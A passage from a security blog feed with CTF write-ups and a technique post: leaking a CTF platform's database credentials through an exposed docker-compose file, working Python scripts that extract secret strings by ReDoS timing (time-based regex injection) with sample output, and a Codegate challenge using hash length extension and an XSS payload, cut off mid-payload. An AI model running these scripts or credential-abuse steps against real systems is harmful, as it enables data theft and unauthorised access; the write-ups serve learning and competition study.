class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span> <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">valign</span>=<span class="string">"top"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"/icons/folder.gif"</span> <span class="attr">alt</span>=<span class="string">"[DIR]"</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"writable/"</span>&gt;</span>writable/<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"right"</span>&gt;</span>2020-02-17 12:37  <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"right"</span>&gt;</span>  - <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span> <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">th</span> <span class="attr">colspan</span>=<span class="string">"5"</span>&gt;</span><span class="tag">&lt;<span class="name">hr</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">address</span>&gt;</span>Apache/2.4.29 (Ubuntu) Server at 172.26.0.1 Port 80<span class="tag">&lt;/<span class="name">address</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Access to the internal folder was possible, of course, but when you crawl and open it in your browser, it looks like this:</p><p><img src="/img/2020/02/pragyan1.gif" alt="pragyan1"></p><p>The github page of the <code>melivora</code> engine can be found, and you can also get a hint from the date of modification, and the file <code>docker-compose.dev.yml</code> contains the credential information of CTF engine.</p><p>Below is the contents of the file <code>docker-compose.dev.yml</code>.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">www-data@5841bda2da57:&#x2F;code$ curl 172.26.0.1&#x2F;mellivora&#x2F;docker-compose.dev.yml</span><br><span class="line">version: &#39;3&#39;</span><br><span class="line">services:</span><br><span class="line">  mellivora:</span><br><span class="line">    image: mellivora</span><br><span class="line">    ports:</span><br><span class="line">      - 4000:80</span><br><span class="line">      - 4002:443</span><br><span class="line">    build:</span><br><span class="line">      context: .</span><br><span class="line">      dockerfile: Dockerfile</span><br><span class="line">    environment:</span><br><span class="line">      MELLIVORA_CONFIG_DB_ENGINE: mysql</span><br><span class="line">      MELLIVORA_CONFIG_DB_HOST: db</span><br><span class="line">      MELLIVORA_CONFIG_DB_PORT: 3306</span><br><span class="line">      MELLIVORA_CONFIG_DB_NAME: [redacted]</span><br><span class="line">      MELLIVORA_CONFIG_DB_USER: [redacted]</span><br><span class="line">      MELLIVORA_CONFIG_DB_PASSWORD: [redacted]</span><br><span class="line">    volumes:</span><br><span class="line">      - .:&#x2F;var&#x2F;www&#x2F;mellivora</span><br><span class="line">      - composerdependencies:&#x2F;var&#x2F;www&#x2F;mellivora&#x2F;include&#x2F;thirdparty&#x2F;composer</span><br><span class="line">    links:</span><br><span class="line">      - db</span><br><span class="line">  db:</span><br><span class="line">    image: mysql:5.6</span><br><span class="line">    ports:</span><br><span class="line">      - 13306:3306</span><br><span class="line">    environment:</span><br><span class="line">      MYSQL_DATABASE: [redacted]</span><br><span class="line">      MYSQL_USER: [redacted]</span><br><span class="line">      MYSQL_PASSWORD: [redacted]</span><br><span class="line">      MYSQL_ROOT_PASSWORD: [redacted]</span><br><span class="line">    volumes:</span><br><span class="line">      - dbdata:&#x2F;var&#x2F;lib&#x2F;mysql</span><br><span class="line">      - .&#x2F;install&#x2F;sql:&#x2F;docker-entrypoint-initdb.d</span><br><span class="line">  adminer:</span><br><span class="line">      image: adminer</span><br><span class="line">      restart: always</span><br><span class="line">      ports:</span><br><span class="line">        - 15246:8080</span><br><span class="line">volumes:</span><br><span class="line">  composerdependencies:</span><br><span class="line">  dbdata:</span><br></pre></td></tr></table></figure><p>CTF service is provided through two containers, <code>mysql:5.6</code> and <code>melivora</code>, using <code>docker-compose</code> . And since database account credential has been leaked, so we can access to CTF database.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$con &#x3D; new mysqli(&#39;172.26.0.1&#39;,&#39;[redacted]&#39;,&#39;[redacted]&#39;,&#39;[redacted]&#39;);</span><br><span class="line">$res &#x3D; $con-&gt;query(&#39;show databases&#39;)-&gt;fetch_all();</span><br><span class="line">var_dump($res);</span><br></pre></td></tr></table></figure><p>Therefore, using the shell of a web challenge to execute php code in this way, all tables and columns(including user credential and flags) in the database could be leaked, and we can drop all databases since we have root privilege (I didn’t test this unnecessarily)</p><p><img src="/img/2020/02/image-20200223043626647.png" alt="image-20200223043626647"></p><p>In this case, it’s because of incredibly bad management.<br>basically, the web services are running on a docker, so there’s no need to install a web server that would be a directory traversal on the host, and to put the contents of the docker stuffs in the webroot.</p><p><img src="/img/2020/02/image-20200223044113588.png" alt="img"></p><p>I don’t know if it’s true, but there are rumors that the organizer of this CTF hasn’t paid the right amount of money for years. (If you know the truth, please leave a comment.)</p><p>Thank you for reading this post.</p>]]></content>
      
      
      <categories>
          
          <category> Docs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pragyan CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Time based Regex Injection</title>
      <link href="/time-based-regex-injection/"/>
      <url>/time-based-regex-injection/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://speakerdeck.com/lmt_swallow/revisiting-redos-a-rough-idea-of-data-exfiltration-by-redos-and-side-channel-techniques" target="_blank" rel="noopener">Revisiting ReDoS: A Rough Idea of Data Exfiltration by ReDoS and Side-channe Techniques</a></li></ul><p>The technique I will introduce this time is <code>Time based Regex Injection</code>.<br>This is a recently announced technique on February 5th.<br>Based on ReDOS vulnerability, This technique makes it possible to extract the full part of string to be compared.</p><p>The research and presentation above was based on Python.<br>I researched for a short period of time how it could be used on JavaScript.</p><h2 id="Regex-DOS"><a href="#Regex-DOS" class="headerlink" title="Regex DOS"></a>Regex DOS</h2><p><img src="https://blog.hackeriet.no/images/RegexNFA.png" alt="regex"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* blocks Event loop */</span></span><br><span class="line">/([a-z]+)+$/.exec(<span class="string">'aaaaaaaaaaaaaaaaaaaaaaaaaaaa!'</span>);</span><br></pre></td></tr></table></figure><p>Traditional ReDOS vulnerabilities are thought to be to the point of ruining the nodejs event loop, which consists of single threads, making it difficult to affect services based on php or python or etc… that respond to requests by forking the process.</p><h2 id="Blind-injection"><a href="#Blind-injection" class="headerlink" title="Blind injection"></a>Blind injection</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'secretmessage'</span>.match(<span class="string">'se(((((.+)+)+)+)+)!'</span>);</span><br><span class="line"><span class="comment">// 2.17s</span></span><br><span class="line"><span class="string">'secretmessage'</span>.match(<span class="string">'sa(((((.+)+)+)+)+)!'</span>);</span><br><span class="line"><span class="comment">// 0.57s</span></span><br></pre></td></tr></table></figure><p>In The <strong>Time based Regex injection</strong>, By adjusting the delay time of the ReDOS to the appropriate level depending on the situation.<br>We can determine the contents of the string being compared through search time.</p><p>The result itself is similar to the <strong>Blind SQL Injection</strong>.</p><h2 id="methods-using-regex"><a href="#methods-using-regex" class="headerlink" title="methods using regex"></a>methods using regex</h2><p>The methods that use regular expressions as factors in <strong>JavaScript</strong> include the <code>exec</code> method and <code>test</code> method of <code>RegExp</code>, <code>match</code> method, <code>place</code> method and <code>split</code> method of <code>String</code>.</p><h2 id="forward-search"><a href="#forward-search" class="headerlink" title="forward search"></a>forward search</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> app = <span class="built_in">require</span>(<span class="string">'express'</span>)();</span><br><span class="line"><span class="keyword">const</span> secret = <span class="string">'THIS-IS-SECRET-DATA'</span>;</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; answer &#125; = req.query;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span> answer == <span class="string">'string'</span> &amp;&amp; !secret.search(answer) &amp;&amp; secret === answer) &#123;</span><br><span class="line">            res.end(secret);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.end(<span class="string">'Something Wrong :('</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        res.end(<span class="string">'Something Wrong :O'</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">80</span>);</span><br></pre></td></tr></table></figure><p>The above is a <strong>server script</strong> for testing.</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, sys</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">prefix = <span class="string">''</span></span><br><span class="line">depth = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt;= <span class="number">3</span>:</span><br><span class="line">    depth = int(sys.argv[<span class="number">2</span>])</span><br><span class="line">    prefix = sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">elif</span> len(sys.argv) &gt;= <span class="number">2</span>:</span><br><span class="line">    depth = int(sys.argv[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">suffix = <span class="string">'('</span> * depth + <span class="string">'.'</span> + <span class="string">'*)'</span> * depth + <span class="string">'!'</span></span><br><span class="line"></span><br><span class="line">r = []</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">'_ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-'</span>:</span><br><span class="line">    begin = time()</span><br><span class="line">    requests.get(<span class="string">'http://localhost'</span>, params = &#123;</span><br><span class="line">        <span class="string">'answer'</span>: prefix + c + suffix</span><br><span class="line">    &#125;);</span><br><span class="line">    r.append([c, time() - begin])</span><br><span class="line"></span><br><span class="line">r = sorted(r, key = <span class="keyword">lambda</span> x: x[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> r[::<span class="number">-1</span>][:<span class="number">3</span>]:</span><br><span class="line">    print(<span class="string">'[*] &#123;&#125; : &#123;&#125;'</span>.format(d[<span class="number">0</span>], d[<span class="number">1</span>]))</span><br></pre></td></tr></table></figure><p>The above is the script to use for testing (<strong>forward search</strong>).</p><p>When It matches the navigation string, takes more time to distinguish the string.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">$ python forward.py 3</span><br><span class="line">[*] T : 11.411083698272705</span><br><span class="line">[*] H : 4.056897163391113</span><br><span class="line">[*] I : 1.1705141067504883</span><br><span class="line"></span><br><span class="line">$ python forward.py <span class="string">'T'</span> 3</span><br><span class="line">[*] H : 3.7386693954467773</span><br><span class="line">[*] _ : 0.020990371704101562</span><br><span class="line">[*] B : 0.02016758918762207</span><br><span class="line"></span><br><span class="line">$ python forward.py <span class="string">'TH'</span> 3</span><br><span class="line">[*] I : 1.3154821395874023</span><br><span class="line">[*] 8 : 0.008851051330566406</span><br><span class="line">[*] 6 : 0.007730245590209961</span><br><span class="line"></span><br><span class="line">$ python forward.py <span class="string">'THI'</span> 3</span><br><span class="line">[*] S : 0.3685579299926758</span><br><span class="line">[*] N : 0.014027118682861328</span><br><span class="line">[*] K : 0.012799263000488281</span><br><span class="line"></span><br><span class="line">$ python forward.py <span class="string">'THIS'</span> 3</span><br><span class="line">[*] - : 0.13479828834533691</span><br><span class="line">[*] M : 0.01068568229675293</span><br><span class="line">[*] _ : 0.004689693450927734</span><br><span class="line"></span><br><span class="line">$ python forward.py <span class="string">'THIS-'</span> 3</span><br><span class="line">[*] I : 0.11702179908752441</span><br><span class="line">[*] N : 0.010607004165649414</span><br><span class="line">[*] J : 0.010245561599731445</span><br><span class="line"></span><br><span class="line">$ python forward.py <span class="string">'THIS-I'</span> 3</span><br><span class="line">[*] S : 0.019062042236328125</span><br><span class="line">[*] 9 : 0.011596441268920898</span><br><span class="line">[*] - : 0.010843992233276367</span><br><span class="line"></span><br><span class="line">$ python forward.py <span class="string">'THIS-I'</span> 4</span><br><span class="line">[*] S : 0.5390925407409668</span><br><span class="line">[*] P : 0.01799798011779785</span><br><span class="line">[*] K : 0.011503458023071289</span><br><span class="line"></span><br><span class="line">$ python forward.py <span class="string">'THIS-IS'</span> 4</span><br><span class="line">[*] - : 0.13084006309509277</span><br><span class="line">[*] C : 0.0070953369140625</span><br><span class="line">[*] I : 0.006118297576904297</span><br></pre></td></tr></table></figure><p>This is how you actually figure out a string through latency.</p><p>But there’s some limitation at this method.</p><table><thead><tr><th>Followed chars</th><th>Load</th><th>Delay time (seconds)</th></tr></thead><tbody><tr><td>1</td><td>-</td><td>-</td></tr><tr><td>2</td><td>-</td><td>-</td></tr><tr><td>3</td><td>220</td><td>1.30</td></tr><tr><td>4</td><td>77</td><td>1.21</td></tr><tr><td>5</td><td>38</td><td>1.55</td></tr><tr><td>6</td><td>22</td><td>1.10</td></tr><tr><td>7</td><td>15</td><td>1.20</td></tr><tr><td>8</td><td>11</td><td>1.21</td></tr><tr><td>9</td><td>9</td><td>1.86</td></tr><tr><td>10</td><td>7</td><td>1.11</td></tr><tr><td>11</td><td>6</td><td>1.55</td></tr><tr><td>12</td><td>5</td><td>1.09</td></tr><tr><td>13</td><td>5</td><td>5.56</td></tr><tr><td>14</td><td>4</td><td>1.19</td></tr><tr><td>15</td><td>4</td><td>4.53</td></tr><tr><td>16</td><td>4</td><td>19.02</td></tr><tr><td>17</td><td>3</td><td>0.61</td></tr><tr><td>18</td><td>3</td><td>1.86</td></tr><tr><td>19</td><td>3</td><td>5.23</td></tr></tbody></table><p>The above shows statistics on the relationship between these delays and the remaining characters.<br>This is greatly affected by the performance of your computer, so please take this as a simple reference.</p><p>The above regular expression was used to determine the value of the string to be compared.</p><p>However, if there is a limit to this method, if the remaining string is less than three characters, the length of the string required for navigation increases rapidly, and in real life the remaining three letters are less reliable because of the overhead or limiting input values.</p><p>Below is another form of regular expression to overcome these limitations.</p><h2 id="backward-search"><a href="#backward-search" class="headerlink" title="backward search"></a>backward search</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, sys</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">prefix = <span class="string">''</span></span><br><span class="line">depth = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt;= <span class="number">3</span>:</span><br><span class="line">    depth = int(sys.argv[<span class="number">2</span>])</span><br><span class="line">    prefix = sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">elif</span> len(sys.argv) &gt;= <span class="number">2</span>:</span><br><span class="line">    depth = int(sys.argv[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">prefix2 = <span class="string">'('</span> * depth</span><br><span class="line">suffix = <span class="string">')*'</span> * depth</span><br><span class="line"></span><br><span class="line">r = []</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">'_ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-'</span>:</span><br><span class="line">    begin = time()</span><br><span class="line">    requests.get(<span class="string">'http://localhost'</span>, params = &#123;</span><br><span class="line">        <span class="string">'answer'</span>: prefix + prefix2 + <span class="string">'[^&#123;&#125;]'</span>.format(c) + suffix + <span class="string">'!'</span></span><br><span class="line">    &#125;)</span><br><span class="line">    r.append([c, time() - begin])</span><br><span class="line"></span><br><span class="line">r = sorted(r, key = <span class="keyword">lambda</span> x: x[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> r[:<span class="number">5</span>]:</span><br><span class="line">    print(<span class="string">'[*] &#123;&#125; : &#123;&#125;'</span>.format(d[<span class="number">0</span>], d[<span class="number">1</span>]))</span><br></pre></td></tr></table></figure><p>You can use the previous information you found to determine whether the string on the back is included!</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ python backward.py <span class="string">'THIS-IS-SECRET-'</span> 40</span><br><span class="line">[*] A : 0.00428318977355957</span><br><span class="line">[*] T : 0.006232500076293945</span><br><span class="line">[*] D : 0.006254673004150391</span><br><span class="line">[*] 4 : 2.561211109161377</span><br><span class="line">[*] M : 2.5667755603790283</span><br></pre></td></tr></table></figure><p>The search shows that the remaining four characters are consist of <code>D T A</code>.<br>After we get this information, we can create a combination of <code>4^4 (256)</code> for brute-force in the worst case.</p><table><thead><tr><th>Followed chars</th><th>Load</th><th>Delay time (seconds)</th></tr></thead><tbody><tr><td>1</td><td>785</td><td>1.38</td></tr><tr><td>2</td><td>224</td><td>0.53</td></tr><tr><td>3</td><td>80</td><td>1.36</td></tr><tr><td>4</td><td>38</td><td>1.39</td></tr><tr><td>5</td><td>22</td><td>1.58</td></tr><tr><td>6</td><td>15</td><td>1.33</td></tr><tr><td>7</td><td>11</td><td>1.34</td></tr><tr><td>8</td><td>9</td><td>2.04</td></tr><tr><td>9</td><td>7</td><td>1.42</td></tr><tr><td>10</td><td>6</td><td>1.75</td></tr><tr><td>11</td><td>5</td><td>1.17</td></tr><tr><td>12</td><td>5</td><td>5.55</td></tr><tr><td>13</td><td>4</td><td>1.20</td></tr><tr><td>14</td><td>4</td><td>4.63</td></tr><tr><td>15</td><td>4</td><td>19.9</td></tr><tr><td>16</td><td>3</td><td>0.65</td></tr><tr><td>17</td><td>3</td><td>1.86</td></tr><tr><td>18</td><td>3</td><td>5.68</td></tr><tr><td>19</td><td>3</td><td>17.4</td></tr></tbody></table><p>The above shows statistics on the relationship between delay time and the remaining characters in the rear navigation.<br>Likewise, the performance of your computer is greatly affected, so please take this as a simple reference.</p><h2 id="Review"><a href="#Review" class="headerlink" title="Review"></a>Review</h2><p>This is a quite general technique.<br>And maybe It would be a good choice to analyze how to affect using this in the various libraries.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://speakerdeck.com/lmt_swallow/revisiting-redos-a-rough-idea-of-data-exfiltration-by-redos-and-side-channel-techniques" target="_blank" rel="noopener">https://speakerdeck.com/lmt_swallow/revisiting-redos-a-rough-idea-of-data-exfiltration-by-redos-and-side-channel-techniques</a></li><li><a href="https://blog.hackeriet.no/regex-dos-in-java-layer/" target="_blank" rel="noopener">https://blog.hackeriet.no/regex-dos-in-java-layer/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Docs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javascript </tag>
            
            <tag> regex dos </tag>
            
            <tag> regex injection </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Codegate CTF 2020 Preliminary</title>
      <link href="/codegate-ctf-2020-preliminary/"/>
      <url>/codegate-ctf-2020-preliminary/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="http://https://ctftime.org/event/938" target="_blank" rel="noopener">https://ctftime.org/event/938</a></li></ul><p><strong>Codegate CTF</strong> is one of the major competitions in Korea.<br>I played on the university student department as <strong>p015x</strong> and ranked <strong>10th</strong>.</p><p><img src="/img/2020/02/%EC%BA%A1%EC%B2%98.gif" alt="img"></p><h2 id="702pts-CSP"><a href="#702pts-CSP" class="headerlink" title="[702pts] CSP"></a>[702pts] <a href="#csp">CSP</a></h2><ul><li><a href="https://file.rwx.kr/ctf/2020/codegate/49770130529af987fff9fb71b97a0abe.zip" target="_blank" rel="noopener">49770130529af987fff9fb71b97a0abe.zip</a></li></ul><blockquote><p>Description :<br>I made an simple echo service for my API practice. If you find bug, please tell me!<br><a href="http://110.10.147.166/" target="_blank" rel="noopener">http://110.10.147.166/</a></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">'config.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">"q"</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">"sig"</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"?"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$api_string = base64_decode($_GET[<span class="string">"q"</span>]);</span><br><span class="line">$sig = $_GET[<span class="string">"sig"</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(md5($salt.$api_string) !== $sig)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"??"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//APIs Format : name(b64),p1(b64),p2(b64)|name(b64),p1(b64),p2(b64) ...</span></span><br><span class="line">$apis = explode(<span class="string">"|"</span>, $api_string);</span><br><span class="line"><span class="keyword">foreach</span>($apis <span class="keyword">as</span> $s) &#123;</span><br><span class="line">    $info = explode(<span class="string">","</span>, $s);</span><br><span class="line">    <span class="keyword">if</span>(count($info) != <span class="number">3</span>)</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    $n = base64_decode($info[<span class="number">0</span>]);</span><br><span class="line">    $p1 = base64_decode($info[<span class="number">1</span>]);</span><br><span class="line">    $p2 = base64_decode($info[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($n === <span class="string">"header"</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(strlen($p1) &gt; <span class="number">10</span>)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">if</span>(strpos($p1.$p2, <span class="string">":"</span>) !== <span class="keyword">false</span> || strpos($p1.$p2, <span class="string">"-"</span>) !== <span class="keyword">false</span>) <span class="comment">//Don't trick...</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        header(<span class="string">"$p1: $p2"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span> ($n === <span class="string">"cookie"</span>) &#123;</span><br><span class="line">        setcookie($p1, $p2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span> ($n === <span class="string">"body"</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/&lt;.*&gt;/"</span>, $p1))</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">echo</span> $p1;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"\n&lt;br /&gt;\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span> ($n === <span class="string">"hello"</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Hello, World!\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Once you have downloaded the attached file, you can see the source above.<br>After receiving two parameters, <strong>sig</strong> and <strong>q</strong>, put a salt before the <em>base64 decoded value</em> to compare with the <strong>sig</strong>.</p><p><strong>Hash validation</strong> in the form <code>$salt + $value</code> for known weak algorithms, such as this issue, may be vulnerable to <strong>length extension attack</strong>.</p><ul><li><a href="https://github.com/bwall/HashPump" target="_blank" rel="noopener">https://github.com/bwall/HashPump</a></li></ul><p>the <strong>HashPump</strong> on the link makes it easy to complete the <strong>length extension attack</strong> payload.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span></span></span><br><span class="line"><span class="tag">&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span></span></span><br><span class="line"><span 